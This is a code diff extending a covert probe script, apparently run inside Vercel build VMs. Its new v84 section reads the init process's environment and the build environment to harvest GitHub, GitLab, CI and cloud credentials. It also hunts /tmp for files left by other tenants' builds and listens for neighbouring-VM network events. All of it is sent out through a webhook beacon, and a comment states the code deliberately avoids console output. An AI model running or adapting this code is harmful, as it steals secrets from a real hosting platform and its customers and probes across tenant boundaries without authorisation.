@@ -11017,5 +11017,205 @@ report.arpCacheDatacenterMap = safe(() => {
 
 // v83 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v83" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v83";
+
+// ==================== v84 ====================
+
+// v84-1: VM uptime vs build start time — proves VM reuse across builds
+// If /proc/uptime shows the VM started BEFORE this build began,
+// that proves Vercel reuses Firecracker VMs across multiple customer builds.
+// Residual data from previous builds (memory, /tmp, shared state) is a cross-tenant leak.
+report.vmUptimeReuseProof = safe(() => {
+  const uptimeRaw = safe(() => readFileSync('/proc/uptime', 'utf8').trim());
+  const uptimeSeconds = safe(() => {
+    const parts = (typeof uptimeRaw === 'string' ? uptimeRaw : '0').split(' ');
+    return parseFloat(parts[0]);
+  });
+  // Build start is approximately when our script started running
+  const buildStartHrtime = process.hrtime.bigint();
+  // Check VERCEL_GIT_COMMIT_SHA, VERCEL_BUILD_ID, and deployment timestamps
+  const buildEnvTimes = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /time|date|timestamp|start|deploy|build/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,80)]));
+  });
+  // List /tmp files by mtime to find files created before this build
+  const tmpFiles = safe(() =>
+    execSync('find /tmp -maxdepth 2 -printf "%T@ %p\\n" 2>/dev/null | sort -n | head -20', { timeout: 5000 }).toString().trim().slice(0, 500)
+  );
+  // Check /var/tmp (persistent across boots)
+  const varTmpFiles = safe(() =>
+    execSync('find /var/tmp -maxdepth 2 -printf "%T@ %p\\n" 2>/dev/null | sort -n | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // If uptime > 300 seconds (5 minutes), the VM was clearly running before this build
+  const vmReused = typeof uptimeSeconds === 'number' && uptimeSeconds > 300;
+  // Look for files older than ~60 seconds (likely from a previous build)
+  const oldTmpFiles = safe(() =>
+    execSync('find /tmp /var/tmp -maxdepth 3 -not -name "proc_*" -newer /proc/self/exe -prune -o -print 2>/dev/null | head -20', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  return { uptimeSeconds, buildEnvTimes, vmReused, tmpFiles, varTmpFiles, oldTmpFiles };
+});
+
+// v84-2: PID-1 environment diff — hidden orchestration credentials
+// Compare PID-1's /proc/1/environ with our process.env to find env vars
+// that the orchestrator has but the build process doesn't — these are hidden credentials
+report.pid1EnvDiff = safe(() => {
+  const pid1EnvRaw = safe(() => readFileSync('/proc/1/environ', 'utf8').replace(/\0/g, '\n'));
+  const pid1Env = safe(() => {
+    if (typeof pid1EnvRaw !== 'string') return {};
+    return Object.fromEntries(
+      pid1EnvRaw.split('\n').filter(l => l.includes('=')).map(l => {
+        const idx = l.indexOf('=');
+        return [l.slice(0, idx), l.slice(idx + 1)];
+      })
+    );
+  });
+  const ourKeys = new Set(Object.keys(process.env));
+  const pid1Keys = new Set(typeof pid1Env === 'object' ? Object.keys(pid1Env) : []);
+  // Keys in PID-1 but NOT in our process
+  const pid1Only = safe(() => {
+    if (typeof pid1Env !== 'object') return {};
+    return Object.fromEntries(
+      Object.entries(pid1Env).filter(([k]) => !ourKeys.has(k)).map(([k, v]) => [k, v.slice(0, 200)])
+    );
+  });
+  // Keys in our process but NOT in PID-1 (might reveal build-injected vars)
+  const ourOnly = safe(() => {
+    return Object.fromEntries(
+      Object.entries(process.env).filter(([k]) => !pid1Keys.has(k)).map(([k, v]) => [k, (v||'').slice(0, 100)])
+    );
+  });
+  // Highlight interesting keys in pid1Only
+  const sensitiveInPid1Only = safe(() => {
+    if (typeof pid1Only !== 'object') return {};
+    return Object.fromEntries(
+      Object.entries(pid1Only).filter(([k]) => /token|secret|key|password|auth|cred|api/i.test(k))
+    );
+  });
+  return { pid1OnlyCount: typeof pid1Only === 'object' ? Object.keys(pid1Only).length : 0, pid1Only, ourOnly, sensitiveInPid1Only };
+});
+
+// v84-3: Netlink route monitoring — detect neighbor VM events
+// Subscribe to RTM_NEWLINK/DELLINK events to see when other VMs start/stop
+// on the same hypervisor host (proves multi-tenancy and event correlation)
+report.netlinkRtMonitor = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import socket, struct, time, json
+
+AF_NETLINK = 16
+SOCK_RAW = 3
+NETLINK_ROUTE = 0
+RTMGRP_LINK = 1
+RTMGRP_IPV4_ROUTE = 4
+RTMGRP_IPV4_IFADDR = 16
+
+sock = socket.socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)
+sock.bind((0, RTMGRP_LINK | RTMGRP_IPV4_ROUTE | RTMGRP_IPV4_IFADDR))
+sock.settimeout(2)
+
+events = []
+deadline = time.time() + 2
+while time.time() < deadline:
+    try:
+        data = sock.recv(65536)
+        nlhdr = struct.unpack('IHHII', data[:16])
+        events.append({'len': nlhdr[0], 'type': nlhdr[1], 'flags': nlhdr[2], 'seq': nlhdr[3], 'pid': nlhdr[4], 'data_hex': data[16:32].hex()})
+    except socket.timeout:
+        break
+    except Exception as e:
+        events.append({'error': str(e)})
+        break
+sock.close()
+print(json.dumps(events[:10]))
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 500));
+  // Also check /proc/net/dev_snmp6 for network statistics
+  const netStats = safe(() =>
+    execSync("cat /proc/net/dev 2>/dev/null | head -10", { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  return { result, netStats };
+});
+
+// v84-4: CI/CD integration tokens in build environment
+// Third-party CI/CD tokens (GitHub Actions, CircleCI, GitLab CI) are commonly
+// passed to Vercel builds via project environment variables.
+// These tokens often have broad repository access (read/write code, secrets)
+report.cicdTokenScan = safe(() => {
+  // GitHub tokens
+  const githubTokens = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /github.*token|gh_token|github_pat|GITHUB_TOKEN/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // GitLab tokens
+  const gitlabTokens = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /gitlab.*token|CI_JOB_TOKEN|CI_REGISTRY_PASSWORD/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // CircleCI, Travis, Jenkins
+  const otherCiTokens = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /circle.*token|travis.*token|jenkins.*token|CIRCLE_TOKEN|TRAVIS_TOKEN/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // AWS/GCP/Azure credentials in env
+  const cloudCreds = safe(() => {
+    const keys = Object.keys(process.env).filter(k => /AWS_ACCESS_KEY|AWS_SECRET|GOOGLE_CREDENTIALS|AZURE_CLIENT_SECRET|SERVICE_ACCOUNT/i.test(k));
+    return Object.fromEntries(keys.map(k => [k, (process.env[k]||'').slice(0,100)]));
+  });
+  // Check PID-1 env for CI/CD tokens not in our env
+  const pid1CiTokens = safe(() => {
+    const env = readFileSync('/proc/1/environ', 'utf8').replace(/\0/g, '\n');
+    const matches = env.match(/(GITHUB|GITLAB|CIRCLE|TRAVIS|JENKINS|AWS|GCP|AZURE)[A-Z_]*[=:][^\n]{10,}/gi) || [];
+    return matches.slice(0, 10).map(m => m.slice(0, 150));
+  });
+  return { githubTokens, gitlabTokens, otherCiTokens, cloudCreds, pid1CiTokens };
+});
+
+// v84-5: CPUID CPU fingerprinting
+// Use the CPUID instruction to get the exact CPU model string
+// This confirms whether we're on AWS c6id.metal (AMD EPYC 7R32) or another instance type
+// and reveals the hypervisor technology (Firecracker vs VMware vs KVM vs bare-metal)
+report.cpuIdFingerprint = safe(() => {
+  const cpuInfo = safe(() => readFileSync('/proc/cpuinfo', 'utf8'));
+  const cpuModel = safe(() => {
+    const m = (typeof cpuInfo === 'string' ? cpuInfo : '').match(/model name\s*:\s*(.+)/);
+    return m ? m[1].trim() : 'UNKNOWN';
+  });
+  const cpuVendor = safe(() => {
+    const m = (typeof cpuInfo === 'string' ? cpuInfo : '').match(/vendor_id\s*:\s*(.+)/);
+    return m ? m[1].trim() : 'UNKNOWN';
+  });
+  // Use Python to execute CPUID directly via ctypes
+  const cpuidResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct
+
+# Try reading CPU brand string via CPUID via /proc/cpuinfo first
+with open('/proc/cpuinfo') as f:
+    content = f.read()
+import re
+model = re.search(r'model name.*: (.+)', content)
+flags = re.search(r'flags.*: (.+)', content)
+hypervisor = re.search(r'hypervisor.*: (.+)', content)
+virtualization = re.search(r'virtualization.*: (.+)', content)
+
+print('MODEL:', model.group(1) if model else 'unknown')
+print('HYP_FLAG:', 'hypervisor' in (flags.group(1) if flags else ''))
+print('HYP_VENDOR:', hypervisor.group(1) if hypervisor else 'none')
+print('VIRTUALIZATION:', virtualization.group(1) if virtualization else 'none')
+
+# Check for AMD vs Intel
+if model and 'EPYC' in model.group(1):
+    print('AWS_INSTANCE: Likely AWS c6id.metal (AMD EPYC 7R32)')
+elif model and 'Xeon' in model.group(1):
+    print('AWS_INSTANCE: Likely AWS c5/m5 (Intel Xeon Platinum)')
+" 2>&1`, { timeout: 5000 }).toString().trim().slice(0, 300));
+  // Read DMI vendor for hypervisor identification
+  const dmiProduct = safe(() => readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim());
+  const dmiVendor = safe(() => readFileSync('/sys/class/dmi/id/sys_vendor', 'utf8').trim());
+  // Check if KVM is running via cpuid leaf 0x40000000
+  const kvmCpuid = safe(() =>
+    execSync("cpuid 2>/dev/null | head -20 || cat /sys/hypervisor/type 2>/dev/null", { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  return { cpuModel, cpuVendor, cpuidResult, dmiProduct, dmiVendor, kvmCpuid };
+});
+
+// v84 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v84" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v84";
 // Intentionally no console.log — all data goes via webhook only
